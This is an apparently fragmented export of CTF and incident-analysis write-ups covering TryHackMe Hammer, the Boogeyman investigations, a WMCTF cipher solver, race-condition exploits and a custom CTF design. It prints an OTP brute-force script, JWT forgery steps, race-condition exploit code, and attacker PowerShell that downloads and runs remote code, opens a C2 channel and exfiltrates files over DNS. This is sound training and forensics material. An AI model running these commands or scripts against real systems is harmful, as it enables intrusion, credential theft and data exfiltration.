By accessing that file, we find anemail address linked to hammer.thm.If we proceed with the password reset processusing an email that doesn’t have an account in the web app database, we wouldsee an error message.However, using the email found in the log file, we proceed without any issuesto the OTP verification.[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for \"/restricted-area\": Password Mismatch[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadowWe will proceed with our testing with the email address tester@hammer.thm.II. OTP Brute ForceReset password process at /reset_password.php: provide a valid email address,then enter the OTP sent to the same address in a time limit of 180 seconds.Attempting random OTPs triggers a rate limit error after the 8th attempt,preventing brute-force attacks within a single session.To bypass this, we must create a new session for each attempt and use apredefined list of 8 random OTPs (probability wise we get the best chance for amatch in a given session). In each iteration, we aim for the session’s valid OTPto match one from our list.Once the correct OTP is identified, we extract the session cookie and use it toreset the password, thereby gaining control of the tester account.The Python code below implements this strategy.import requestsreset_url = 'http://&lt;target_ip&gt;:1337/reset_password.php'email = 'tester@hammer.thm'def main(): otps = [1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344] while True: print('init new session') session = requests.Session() rsp = session.post(reset_url, data={'email': email}) if ('You can enter your code' in rsp.text): print('sending otps ...') for otp in otps: reset = session.post(reset_url, data={'recovery_code': otp, 's':150}) if reset.text == 'Rate limit exceeded.

Boom.. changedyour password tester.III. JWT ExploitationOnce logged in, the dashboard page allows the user to execute a few commands.I think the only one that was successfully executed was ls.I moved to Burp to investigate the requests in more depth.Upon login, a JWT token is sent back for the user to use in further requests.The token is used to authenticate/authorize the user when executing commands.The content of the JWT token:// headers{ \"typ\": \"JWT\", \"alg\": \"HS256\", \"kid\": \"/var/www/mykey.key\"}// data{ \"iss\": \"http://hammer.thm\", \"aud\": \"http://hammer.thm\", \"iat\": 1736609939, \"exp\": 1736613539, \"data\": { \"user_id\": 1, \"email\": \"tester@hammer.thm\", \"role\": \"user\" }}An interesting detail is the use of kid in the JWT header. Since a JWT isdesigned to contain all the necessary information to authenticate a user in adecentralized manner, I initially assumed that kid specifies the path to thesecret key used to sign the token.During exploration, we discovered a key file using the ls command. By accessingthe file through the web application at http://&lt;target_ip&gt;:1337/188ad1.key, weretrieved its contents.56058354efb3daa97ebab00fabd7a7d7To exploit this, we set the kid value in the JWT header to /vaar/www/html/188ade1.key,pointing directly to the key file for token verification.We can use JWT.io to forge a new token with admin role.Send the post request to /execute_command.php to the repeater tab and changethe value of the header Authorization: bearer &lt;token&gt; to the new value.Congrats, you can now execute any command as the user www-data.To finish the challege, execute cat /home/ubuntu/flag.txt." }, { "title": "Chirpy React", "url": "/projects/chirpy-react/", "categories": "Projects, Web Frontend", "tags": "Typescript, ReactJs, Redux, Markdown", "date": "2025-01-01 00:00:00 +0100", "snippet": "I.

Using this initial email access,the threat actors attempted to expand the impact by targeting the CEO, EvanHutchinson.The email appeared questionable, but Evan still opened the attachment despitethe scepticism. After opening the attached document and seeing that nothinghappened, Evan reported the phishing email to the security team. Upon receiving the phishing email report, the security team investigated theworkstation of the CEO. During this activity, the team discovered the emailattachment in the downloads folder of the victim. In addition, the securityteam also observed a file inside the ISO payload Lastly, it was presumed by the security team that the incident occurredbetween August 29 and August 30, 2023. Given the initial findings, you aretasked to analyse and assess the impact of the compromise.In this investigation we will be leveraging Kibana to assess the impact of therecent Boogeyman’s attack.Once in the home page, head over to Discover tab under Kibana Analytics sectionand make sure to select the right time periode of the incident.Our investigation will be based on events recorded with Sysmon. We will focusfirst on executed/created processes (Sysmon EventId 1) and see what we can findout. The first process we see is already very promising. It is most likely tobe a ransomware, based on its name ransomboogey.exe.Good enough, but let’s not get ahead of ourselves and start from the actualbeginning (newest events are displayed on the top). Viewing events in chronologicalorder (oldest first) and querying for events with the keyword “Financial” as inname of the malicious attachment shows us 4 events. The first event refers tothe execution of mshta.exe (PID 6392) spawned by explorer.exe,and the rest of the events are child processes of mshta.exe.mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files,this corresponds to the malicious file filetype masquerading as PDF. Theexecution of this first stage of the payload resulted in: (PID 6204) Implanting the file review.dat from the mounted drive into the CEO user space C:\\Windows\\System32\\xcopy.exe /s /i /e /h D:\\review.dat C:\\Users\\EVAN~1.HUT\\AppData\\Local\\Temp\\review.dat (PID 3832) Executing a DLL function from the implanted .dat rogue file (which is actually DLL file) C:\\Windows\\System32\\rundll32.exe D:\\review.dat,DllRegisterServer (PID 3680) Establishing persistence via the new scheduled task named Review \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" $A = New-ScheduledTaskAction -Execute 'rundll32.exe' -Argument 'C:\\Users\\EVAN~1.HUT\\AppData\\Local\\Temp\\review.dat,DllRegisterServer'; $T = New-ScheduledTaskTrigger -Daily -At 06:00; $S = New-ScheduledTaskSettingsSet; $P = New-ScheduledTaskPrincipal $env:username; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask Review -InputObject $D -Force; Continuing our investigation by following the traces of step 2 (PID 3832), thescreenshot below lists other processes called upon execution of that process.The list of the executed commands is listed right after.C:\\Windows\\system32\\cmd.exe /c \"whoami /all\"C:\\Windows\\system32\\net.exe usersC:\\Windows\\system32\\net.exe localgroup administratorsC:\\Windows\\system32\\whoami.exe /groupsC:\\Windows\\system32\\fodhelper.exeC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c \"$credential = (New-Object PSCredential -ArgumentList ('QUICKLOGISTICS\\allan.smith', (ConvertTo-SecureString 'Tr!ckyP@ssw0rd987' -AsPlainText -Force))) ; Invoke-Command -Credential $credential -ComputerName WKSTN-1327 -ScriptBlock {powershell -enc SQBmACgAJAB...SNIP...kAKQB8AEkARQBYAA==}\"Commands from line 1 to 4 enumerate the machine’s system, gathering informationabout users and groups especially administrators. The command in line 5, sinceit was executed by the malicious document, uses a common exploitation offodhelper.exe to bypass UAC. As a quick refresher, User AccountControl is a mechanism to safeguard privilege elevation, in simple termsvalidating a user (in this case an admin) has the right to execute high-privilegeactions. fodhelper.exe on the other hand is a legitimate Windows executableassociated with managing optional Windows features. It runs with elevatedprivileges, which makes it a target for exploitation.Boogeyman downloaded a tool from Github to dump credentials. Looking for Githubaccess, we find the tool being used. Should have guessed it, mimikatz.What credentials were accessed by the Boogey? Let’s see. Filtering for mimikatz,on machine WKST-0051, we notice that the adversary uses the module sekurlsa toimpersonate users by providing only the hashes of their passwords, the case inthe following screenshot with itadmin:F84769D250EB95EB2D7D8B4A1C5613F2.To find out how the attacker found the credentials of allan.smith, I Looked upsome help as I didn’t have an idea of what tool could be used for this purpose.The fact is that Boogeyman downloaded and enumeration tool from Githuband used it to discover file shares (local and remote). He then accessed the fileIT_Automation.ps1 which happens to contain creds of Allan.Back to review.dat DLL.The last command on the list tries to execute, remotely on machine WKSTN-1327,an encoded PowerShell script block as the user allan.smith. Below is the content of that script. Note, the server value is decoded to http://cdn.bananapeelparty.net:80. As far as we can understand from the script,this establishes an RC4-encrypted C2 channel with the previously mentionned server.If ($PSVersionTable.PSVersion.Major -ge 3) {}[System.Net.ServicePointManager]::Expect100Continue = 0$wc = New-Object System.Net.WebClient$userAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'$wc.Headers.Add('User-Agent', $userAgent)$server = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String( 'aAB0AHQAcAA6AC8ALwBjAGQAbgAuAGIAYQBuAGEAbgBhAHAAZQBlAGwAcABhAHIAdAB5AC4AbgBlAHQAOgA4ADAA'))$path = '/admin/get.php'$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials$Script:Proxy = $wc.Proxy$key = [System.Text.Encoding]::ASCII.GetBytes('}wS1&amp;VNqoIY*G#5-Plv{p2f=4Z?uat@&lt;')$RC4 = { param ($data, $key) $S = 0..255 $j = 0 for ($i = 0; $i -lt 256; $i++) { $j = ($j + $S[$i] + $key[$i % $key.Length]) % 256 $S[$i], $S[$j] = $S[$j], $S[$i] } $i = 0 $j = 0 $data | ForEach-Object { $i = ($i + 1) % 256 $j = ($j + $S[$i]) % 256 $S[$i], $S[$j] = $S[$j], $S[$i] $_ -bxor $S[($S[$i] + $S[$j]) % 256] }}$wc.Headers.Add(\"Cookie\", \"rlkHVXWbb=13cfco9rUXx0i4J3xTu682JFiX0=\")$data = $wc.DownloadData($server + $path)$iv = $data[0..3]$data = $data[4..$data.Length]-join [Char[]](&amp; $RC4 $data ($iv + $key)) | Invoke-ExpressionBased on the gathered info so far, we can trace connections to the C2 server.Filtering for network events (Sysmon EventId 3) and connections over port 80,there is only one IP address responsible for all the traffic;165.232.170.151. Hence, it must be the C2 address.The lateral movement command was executed at 2023-08-30 01:40:37.178. Based onthat timestamp, checking allan.smith’s activity on WKSTN-1327 indicates thatthe parent process is wsmprovhost.exe.On the second machine, Boogeyman used the same procedure to dump credentials.Hence the same trick will show us the accessed credentials of the administrator.administrator:00f80f2538dcb54e7adc715c0e7091ec.A DCSync attack simulates the behavior of a Domain Controller and asks otherDomain Controllers to replicate information using the Directory ReplicationService Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessaryfunction of Active Directory, it cannot be turned off or disabled.Boogey leveraged mimikatz again to conduct that attack. The evidences leftshows an access to backupdata account.Now, remember ransomboogey from the very beginning? The last piece of thepuzzle is to identify from where it was downloaded. This info is easily accessiblewith a simple search for ransomboogey: http://ff.sillytechninja.io/ransomboogey.exe.It is legitimate to hope the Boogeyman does not come back again. But this isan uncontrollable factor. What is controllable however, is to level up thecompany’s security posture." }, { "title": "Boogeyman 2", "url": "/posts/boogeyman-2/", "categories": "CTF Writeups, TryHackMe, SOC 1", "tags": "DFIR, Phishing, Volatility, Olevba", "date": "2024-11-05 00:00:00 +0100", "snippet": " After having a severe attack from the Boogeyman, Quick Logistics LLC improvedits security defences.

This allows applications and Windows itself to retrieve paths forcommonly used directories, which can vary by user or be redirected to networklocations.It looks like Boogeyman is trying altering system behavior to run malwarewhenever the user accesses or saves data to a specific folder, thereby makinghimself more persistent and harder to remove.Looking back to the processes list, updater.exe is of PID 6216.Based on this information, we trace the connections to the C2 server usingnetscan plugin$ vol -f WKSTN-2961.raw windows.netscanOffset\t Proto\tLocalAddr\tLocalPort ForeignAddr ForeignPort\tState\tPID\t Owner\t Created...SNIP...0xe58f86a9d950\tUDPv4\t0.0.0.0 0 *\t0\t\t660 lsass.exe\t2023-08-21 13:59:26.000000 0xe58f86a9d950\tUDPv6\t::\t 0 *\t0\t\t660 \t lsass.exe\t2023-08-21 13:59:26.000000 0xe58f86b1b770\tTCPv4\t10.10.49.181\t63331\t 128.199.95.189\t8080\tCLOSED\t6216\tupdater.exe\t2023-08-21 14:15:17.000000 0xe58f86b73010\tTCPv4\t10.10.49.181\t63308\t 128.199.95.189\t8080\tCLOSED\t6216\tupdater.exe\t2023-08-21 14:14:39.000000 0xe58f86b9ebf0\tTCPv4\t10.10.49.181\t63291\t 128.199.95.189\t8080\tCLOSED\t6216\tupdater.exe\t2023-08-21 14:14:13.000000 0xe58f86ba7bf0\tTCPv4\t10.10.49.181\t63242\t 20.189.173.10\t443\t CLOSED\t1124\tWINWORD.EXE\t2023-08-21 14:12:39.000000 Finally with the last piece of information we are curious about, what the Boogeyscheduled on the compromised machine.

Using jq, we can filter for the values of ScriptBlockText,as it contains the powershell commands being executed.We know already that Boogeyman uses bpakcaging.xyz to host some of its artefacts.Thus, we can narrow down our search in the logs to only the entries with that value:$ cat powershell.json | jq \".ScriptBlockText\" | grep bpakcaging\"$s='cdn.bpakcaging.xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{\\\"X-38d2-8f49\\\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{\\\"X-38d2-8f49\\\"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\\\"X-38d2-8f49\\\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}\\n\"\"iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')\"\"iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe;pwd\"\"iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;pwd\"\"$split = $hex -split '(\\\\S{50})'; ForEach ($line in $split) { nslookup -q=A \\\"$line.bpakcaging.xyz\\\" $destination;} echo \\\"Done\\\";;pwd\"It is now clear that the attacker is using files.bpakcaging.xyz andcdn.bpakcaging.xyz to host C2 related artefacts.To view all relevant powershell commands, we can use the same command and filterout non interesting entries (particularly Set-StrictMode).$ cat powershell.json | jq \".ScriptBlockText\" | grep -v Set-StrictModenull\"iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd\"null\"ps;pwd\"nullnull\"cd j.westcott;pwd\"...SNIP...\".\\\\sb.exe -group=user;pwd\"null\"Seatbelt.exe -group=user;pwd\"null\"split-path $pwd'\\\\0x00';pwd\"...SNIP...\"cd Documents;pwd\"null\".\\\\Music\\\\sq3.exe AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\LocalState\\\\plum.sqlite \\\"SELECT * from NOTE limit 100\\\";pwd\"null\".\\\\sq3.exe AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\LocalState\\\\;pwd\"...SNIP...\"$split = $hex -split '(\\\\S{50})'; ForEach ($line in $split) { nslookup -q=A \\\"$line.bpakcaging.xyz\\\" $destination;} echo \\\"Done\\\";;pwd\"null\"$hex = ($bytes|ForEach-Object ToString X2) -join '';;pwd\"null\"$file='C:\\\\Users\\\\j.westcott\\\\Documents\\\\protected_data.kdbx'; $destination = \\\"167.71.211.113\\\"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd\"Notice that the attacker executed Seatbelt, which is an enumerationtool.

Hence, we can assume the bad guy didexfiltrate some important password-protected data from Julianne’s machine.The adversary used nslookup to exfiltrate the data, which is a DNSsmuggling technique.III. They got us. Call the bank immediately!Based on the PowerShell logs investigation, we have seen the full impact of the attack: The threat actor was able to read and exfiltrate two potentially sensitivefiles (plum.sqlite and protected_data.kdbx). The domains and ports used for the network activity were discovered, includingthe tool used by the threat actor for exfiltration.The adversary used an HTTP server to host his artefacts. Filtering for HTTPin Wireshark and looking for requests with the hostname files.bpakcaging.xyz,we find a stream that can be used to identify the software used by the server,i.e. SimpleHTTP Python server.Similarly by looking at HTTP requests made to the host cdn.bpakcaging.xyz, we see that the adversary used POST requests to send data to the server.Filtering packets and following an HTTP streamThe C2 HTTP server detailsWe found out from before that our Boogeyman exfiltrated (smuggled) data overDNS using nslookup. In the following screenshot, we validate that our APTlookup subdomains of bpakcaging.xyz, where each subdomain is a hexadecimalencoding of the next line in the file to be smuggled (checkout the powershellcommand above). Boogeyman can reconstruct the file based on all received DNSqueries.DNS smuggling through subdomainsBack to C2 communication. We need to understand how the communication is takingplace to be able to complete our investigation.

HR people don’t use command-line tools sothis must be suspicious.We can filter the logs to show only request with bitsadmin as the user agent.We end up with two requests, the source ip must be the one of the suspected user,i.e. 192.166.65.54.From the same view, we can identify the filesharing website used to establish C2connection, or to be more precise, to download a file that may be used to establishC2 connection, which is pastebin.com.The full url to which the infected host connected is host + uri,i.e. pastebin.com/yTg0Ah6a.We can access that url in a sandboxed environnement (to avoid the unknown) andsee what kind of files the host did access.The file secret.txt was downloaded, which contains the maliciouspattern THM{SECRET__CODE}." }, { "title": "K-Cessation", "url": "/posts/k-cessation/", "categories": "CTF Writeups, WMCTF 2024", "tags": "Cryptography, K-Cessation", "date": "2024-09-09 00:00:00 +0200", "snippet": "A.

The algorithmK-Cessation cipher is a cipher that uses a K-bits wheel to pick the next cipherbit matching the plaintext bit. When encryption starts, the wheel starts at thelast bit of the wheel and loops around when it reaches the end.For every plaintext bit, the wheel is rotated to the next bit in the wheel thatmatches the plaintext bit, and the distance rotated is appended to theciphertext. Therefore, if the wheel is not known, it is not possible to decryptthe ciphertext.

The challengeA flag is encoded with 64-Cessation cipher.The ciphertext is given and the wheel is not known.The flag is only known to be an ascii string that is longer than 64 characters.No part of the flag is known, which means the flag is NOT in WMCTF{} or FLAG{}format. The most significant bit of each byte is flipped with a random bit.You need to extract the flag from the ciphertext and submit it.For your convenience, a salted sha256 hash of the flag is given in flag_hash.txt.BrainstormingWith only the ciphertext at hand, we can extract some juicy information aboutthe similarity of the wheel’s bits: Similar bits.For each ciphertext entry that is greater than or equal to 3, we can identifyat least two similar bits of the key. In fact, the current wheel position willkeep moving forward until the bit matching the plaintext bit is found, whichimplies that all the bits visited before are of the opposite value. Different bits.Similar to the previous reasoning, for each cipher text greater than or equalto 2, we can conclude that the current wheel position and the previous one aretwo bits of different value. SolutionThe information leaked about the key can help in reducing the set of possiblekeys, which makes it easier for us to brute force the flag value.The solution we propose in the following script does exactly that: We firstidentify similarities of the key’s bits, then we construct a set of all validkeys according to the previous conditions, and finally we decrypt the ciphertextand check the correctness of the result flag by comparing its hash to the givenone.import hashlib# given challenge fileimport chal# given ciphertext, wheel's length, and the flag hashct = [2, 1, 1, 3, 1, 1, 3, 2, 1, 4, 1, 2, 3, 1, 1, 1, 2, 1, 1, ...SNIP..., 1, 1, 2, 1]HASH = \"d650078ae91d82ebd1d586110960a789c1a15e2cbc053b9daf8d8a4905950720\"SALT = \"b840089ce93581869e9c02a7b5aefa7b\"LEN = 64def identify_similarity(ctext) -&gt; tuple[list, list]: \"\"\"idenfy similar and different bits of the wheel\"\"\" similars = [] differents = set() ptr = -1 # idetify sets of similar consecutive bits based on the ct for v in ctext: ptr += v ptr %= LEN if v &gt;= 2: similar = {(ptr-i)%LEN for i in range(1, v)} differents.add(((ptr-1)%LEN, ptr)) similars.append(similar) # remove repetitions clean = [] for s in similars: intersected = False for i in range(len(clean)): if len(s.intersection(clean[i])) != 0: intersected = True clean[i] = clean[i] | s if not intersected: clean.append(s) # order lists ordered = [list(s) for s in clean] ordered.sort() differents = list(differents) differents.sort() return ordered, differentsdef get_sim_indexes(idx, sim): \"\"\"for given index of the wheel, return range of similar bits\"\"\" for li in sim: li.sort() if idx in li: return li[0], li[-1] return idx, idxpotential_wheels = set()def fill_wheel(wheel: list[str], sim, diff): \"\"\" construct potential wheels, the initial wheel contains only asteriscs wheel = [\"*\", \"*\", \"*\", ..., \"*\"] \"\"\" if wheel.count(\"*\") == 0: # a whell is constructed, add it to the list potential_wheels.add(\"\".join(wheel)) else: # construct one curr_idx = wheel.index(\"*\") if wheel[curr_idx-1] == \"*\": a, b = get_sim_indexes((curr_idx-1)%LEN, sim) w1 = [i for i in wheel] for i in range(a, b+1): w1[i] = \"0\" fill_wheel(w1, sim, diff) w2 = [i for i in wheel] for i in range(a, b+1): w2[i] = \"1\" fill_wheel(w2, sim, diff) elif ((curr_idx-1)%LEN, curr_idx) in diff: a, b = get_sim_indexes(curr_idx, sim) for i in range(a, b+1): wheel[i] = \"1\" if wheel[curr_idx-1] == \"0\" else \"0\" fill_wheel(wheel, sim, diff) else: a, b = get_sim_indexes(curr_idx, sim) w1 = [i for i in wheel] for i in range(a, b+1): w1[i] = \"0\" fill_wheel(w1, sim, diff) w2 = [i for i in wheel] for i in range(a, b+1): w2[i] = \"1\" fill_wheel(w2, sim, diff)def filter_wheels(wheels, sim, diff) -&gt; list: \"\"\"validate given wheels according to similarity extracted from ciphertext\"\"\" valid = [] for wheel in wheels: good = True for bits in sim: value = wheel[bits[0]] if not all((wheel[i] == value for i in bits)): good = False for bits in diff: if wheel[bits[0]] == wheel[bits[1]]: good = False if good: valid.append(wheel) return validif __name__ == \"__main__\": # construct potential wheels similars, differents = identify_similarity(ct) fill_wheel([\"*\" for _ in range(LEN)], similars, differents) potential_wheels = filter_wheels(potential_wheels, similars, differents) # convert content to integers wheels = [[int(i) for i in st] for st in potential_wheels] for wheel in wheels: # check if the wheel is the one used in encryption # validate so by comparing the hash of the found plaintext with the given hash cipher = chal.K_Cessation([int(k) for k in wheel]) try: pt = cipher.decrypt(ct) pt = chal.decode_ascii_with_random_msb(pt) if hashlib.sha256((SALT + pt.decode()).encode()).hexdigest() == HASH: print(pt) except Exception as e: continue The code maybe optimized in length and performance.Result: DoubleUmCtF[S33K1NG_tru7h-7h3_w1s3-f1nd_1n57e4d-17s_pr0f0und-4b5ence_n0w-g0_s0lv3-th3_3y3s-1n_N0ita]" }, { "title": "Race Conditions Challenge", "url": "/posts/race-condition/", "categories": "CTF Writeups, TryHackMe", "tags": "C, Race Condition", "date": "2024-08-18 00:00:00 +0200", "snippet": " Checkout Race Conditions room on TryHackMeIn this room, we are faced with three challenges; walk, run, and sprint.For each one, a vulnerable SUID binary is given, its source code, and a flagfile....", "content": " Checkout Race Conditions room on TryHackMeIn this room, we are faced with three challenges; walk, run, and sprint.For each one, a vulnerable SUID binary is given, its source code, and a flagfile.

Yes, it is the usleep call. This call makes the process sleepfor 500 microseconds. This is enough to play the same trick on the given pathand allow for disclosing the flag’s content.We can easily abuse the program’s logic by running the binary in the backgroundand execute a custom command afterwardsLet’s test it then:race@car:/home/run$ ./cat2 some_file &amp; (sleep 0.00001 &amp;&amp; echo VULNERABLE)[1] 1460Welcome to cat2!This program is a side project I've been working on to be a more secure version of the popular cat commandUnlike cat, the cat2 command performs additional checks on the user's security contextThis allows the command to be security compliant even if executed with SUID permissions!Checking the user's security context...VULNERABLEContext has been checked, proceeding![SECURITY BREACH] The user does not have access to this file!Terminating...[1]+ Exit 1 ./cat2 ../race/fileNotice that “VULNERABLE” was printed right after the security check.

Creating a new handler thread...\\n\"); pthread_create(&amp;thread, 0, run_thread, (void *) connection); pthread_detach(thread); } } return 0;}In short, the program creatss a server socket on port 1337. For each receivedconnection, a thread is created, which will handle the user’s requests tomanipulate his “bank account”. If we want to get the flag, we need at least15000 credit. We cannot just deposit enough amount of money sequentiallybecause the money value is reset right before the thread is terminated.Thus, an exploitation of this program would be by creating as many connectionsas needed (2) to deposit enough money to get the flag, then one extra thread toretreive the flag before the money value go back to zero.Here is our code:#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;string.h&gt;#define SERVER_IP \"127.0.0.1\"#define SERVER_PORT 1337#define NUM_CONNECTIONS 3#define MONEY_THRESHOLD 15000void *deposit_money(void *arg) { int sock; struct sockaddr_in server; char message[1024], server_reply[1024]; // Create socket sock = socket(AF_INET, SOCK_STREAM, 0); if (sock == -1) { perror(\"could not create socket\"); pthread_exit(NULL); } server.sin_addr.s_addr = inet_addr(SERVER_IP); server.sin_family = AF_INET; server.sin_port = htons(SERVER_PORT); // Connect to remote server if (connect(sock, (struct sockaddr *)&amp;server, sizeof(server)) &lt; 0) { perror(\"connect failed. error\"); close(sock); pthread_exit(NULL); } // Send deposit command strcpy(message, \"deposit\\n\"); if (send(sock, message, strlen(message), 0) &lt; 0) { perror(\"deposit failed\"); close(sock); pthread_exit(NULL); } // Receive a reply from the server if (recv(sock, server_reply, 1024, 0) &lt; 0) { perror(\"recv failed\"); } printf(\"Server reply:\\n%s\", server_reply); // Close the socket close(sock); pthread_exit(NULL);}void *get_flag(void *arg) { int sock; struct sockaddr_in server; char message[1024], server_reply[1024]; // Create socket sock = socket(AF_INET, SOCK_STREAM, 0); if (sock == -1) { perror(\"could not create socket\"); pthread_exit(NULL); } server.sin_addr.s_addr = inet_addr(SERVER_IP); server.sin_family = AF_INET; server.sin_port = htons(SERVER_PORT); // Connect to remote server if (connect(sock, (struct sockaddr *)&amp;server, sizeof(server)) &lt; 0) { perror(\"connect failed. error\"); close(sock); pthread_exit(NULL); } // Send purchase flag command strcpy(message, \"purchase flag\\n\"); if (send(sock, message, strlen(message), 0) &lt; 0) { perror(\"failed to get flag\"); close(sock); pthread_exit(NULL); } // Receive a reply from the server if (recv(sock, server_reply, 1024, 0) &lt; 0) { perror(\"recv failed\"); } printf(\"Server reply:\\n%s\", server_reply); // Close the socket close(sock); pthread_exit(NULL);}int main(int argc, char **argv) { pthread_t threads[NUM_CONNECTIONS]; for (int i = 0; i &lt; NUM_CONNECTIONS - 1; i++) { pthread_create(&amp;threads[i], NULL, deposit_money, NULL); } pthread_create(&amp;threads[NUM_CONNECTIONS-1], NULL, get_flag, NULL); return 0;}With some luck we get the flag:race@car:~$ ./abs Server reply:Current balance: 10000Server reply:Current balance: 20000Server reply:THM{R4c1n6_f0r_7h47_5w337_******}Current balance: -15000 The scripts and commands here may not work at the first try.

We add a path where write permissionsare granted to rabbit and add in there our own date program.In our case:echo $PATH # out: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binPATH=\"/home/rabbit:$PATH\"echo $PATH # out: /home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin#!/bin/bashbash3.

If you want to give this CTF a try before reading this, you can cloneSNK1 repository from GitHub to your virtual machine, then runmachine/setup.sh script. Happy hacking!A. The web appThe web app is designed to be the initial point of assessment for players.The objective of hacking the web app is to obtain the credentials of auser on the machine. Achieving this will allow players to practice thefollowing skills: Basic enumeration and source code inspection Hash cracking SQL injection Local File Inclusion / source code disclosureExplorationPlayers typically begin by exploring the web app manually or by fuzzingfor hidden content, which is exactly what we anticipate. The /robots.txtfile usually contains information about content that should not be indexed,and it can sometimes reveal interesting details.In our case, the /robots.txt file only contains a hintpointing to the /titans.txt file. The /titans.txtfile provides some facts about titans and includes a clue leading to adirectory called /shiganshina.. and.. it all started fromShiganshina.# No robots.. only titans# ...# walls of /shiganshina are destroyed by a colossal titan that appears out of thin air. As the smaller titans flood# ...Navigating to /shiganshina, players will find three portalsrepresenting the three military groups, each maintained by its respectivefaction. After exploring and inspecting the source code of these pages,they will uncover a path to a hidden file located at /0ff1c3rs_leak.zip.According to the comments, this zip file contains credentials from a recentpolice breach. Players will need to leverage the fact that some passwordsmay not have been changed yet. However, the zip file is password-protectedand must be brute-forced using tools like John the Ripper and therockyou.txt wordlist. Spoiler: The password is “Titans curse”.As seen in season 3, the military police are closely monitoring the scouts’progress in their quest to understand and combat the titans. Once playersgain access to a police member’s account, they can exploit two vulnerabilitiesin the app to access a hidden database table containing information aboutthe scouts. The ultimate goal is to obtain Armin’s SSH credentials.Local File InclusionThe valid credentials for accessing the system belong to Hitch. Playersmight notice that the URL for the home page includes a page queryparameter. This observation should prompt them to test for a fileinclusion vulnerability.In this scenario, the attacker can exploit a PHP filter to read the sourcecode of shiganshina/police/index.php. This file will revealthe presence of another file on the server, db_connection.php,which is used to establish a connection to the database server. Due to poordevelopment practices, the database credentials are hardcoded into this PHPfile.With these credentials, the attacker can connect to the database and accessall hosted data, including Armin’s SSH credentials.SQL InjectionIf the previous vulnerability went unnoticed, there is an additional oneon the members page. The search field is vulnerable to SQL injection,which can be detected by appending a single quote ' to the end of thequery. This particular SQL injection is boolean-based, meaning a customerror message is displayed if the query is invalid.Once the vulnerability is identified, the attacker can use it to enumeratethe database’s tables. By exploring the database, they will eventuallyfind Armin’s credentials.A foot hold into the machineHere we go, the player now have access to Armin’s credentials, but thepassword is hashed and should be cracked first. The process includes theidentification of the hash and the choice of a suitable wordlist to launchthe attack. Many tools can be used to identify the hash algorithm, e.g. hashid. The password, once again, is present in the rockyou wordlist.a.arlert:a858ac15923bcf64ce5b50d3d3c341385c51e4e0fc58f0579db2a1d9f77237bd5e1136f8a12241403f04857127ddd76b3535fb7d381ab32fe4e118d5149fad3e Crack common passwords’ hashes online with Crackstation2B. Privilege EscalationIn this section, the player will practice escalation techniques related to: SUID binary with PATH manipulation Misconfigured Network File ShareOverviewThe machine hosts accounts for several members of the Survey Corps,including Armin’s, Hanji’s, and Erwin’s. The other accounts are intendedto serve as distractions. Therefore, the ultimate goal of this section isto gain access to Erwin’s account.The relevant part of the filesystem hierarchy will be as follows:/home/ |__ a.arlert # foothold |__ m.zacharias # distraction |__ h.zoe | |__ titans \t # SUID binary | |__ scouts_share\t\t# NFS |__ e.smith |__ plan.txt # target |__ plan.jpgRegarding permissions: Home Folders: By default, users will not have access to other users’ home folders. The exception is Hanji’s home directory, which is accessible to everyone. This allows users to specifically access the titans binary. Scouts Share Directory: The directory /home/h.zoe/scouts_share will be restricted and accessible only to Hanji, the owner. From Armin To HanjiHanji’s home directory contains a SUID binary named titans.Normally, this binary is used to access information about all titans.However, the titans binary makes a call to another binarycalled titan, which does not exist on the system.Here is the decompiled titans binary:#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main(){ setuid(0); setgid(0); printf(\"SC :: Titans database\\n\"); char *titans[3] = {\"eren\", \"armored\", \"colossal\"}; for (int i = 0; i &lt; 3; i++) { printf(\"retreiving information of %s ... \\n\", titans[i]); char buffer[100]; snprintf(buffer, sizeof(buffer), \"titan %s\\n\", titans[i]); system(buffer); } return 0;}Once the attacker observes that the titans binary calls a non-existenttitan binary, the next step is to create a program with the same name,titan, and place it in a 